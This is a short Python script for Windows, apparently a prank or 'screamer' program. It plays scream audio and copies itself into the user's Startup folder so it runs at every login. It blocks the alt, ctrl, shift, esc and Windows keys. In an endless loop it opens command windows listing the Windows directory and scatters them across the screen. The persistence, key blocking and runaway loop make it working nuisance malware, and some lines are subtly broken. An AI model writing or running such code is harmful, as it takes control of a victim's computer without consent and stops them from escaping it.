import keyboard
import time
import os
import random
import win32gui
from win32api import GetSystemMetrics
import shutil
import getpass
import sys
import pygame   
from pygame import mixer

pygame.mixer.music.load('scream1.mp3')
pygame.mixer.music.play(0)
lvl3 = True
while True:
            pygame.mixer.music.load('scream2.mp3')
            pygame.mixer.music.play(0)

            username = getpass.getuser()
            filename = sys.argv[0]
            dir_name = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
            shutil.copy(filename, dir_name)

            keyboard.block_key("alt")
            keyboard.block_key("ctrl")
            keyboard.block_key("shift")
            keyboard.block_key("esc")
            keyboard.block_key("win")
            keyboard.block_key("alt"and"F4")

            _Scr_Width = GetSystemMetrics(0)
            _Scr_Height = GetSystemMetrics(1)
            num_windows = 1
            for i in range(num_windows):
                os.system(f'start "win (i)" '
                    f'cmd /c "cd /windows'
                    f' && dir /s"')
            time.sleep(0.1)
            handle = win32gui.FindWindow(0, f'win {i}')
            win32gui.MoveWindow(
                handle,
                random.randrange(_Scr_Width),
                random.randrange(_Scr_Height),
                700, 400, True)             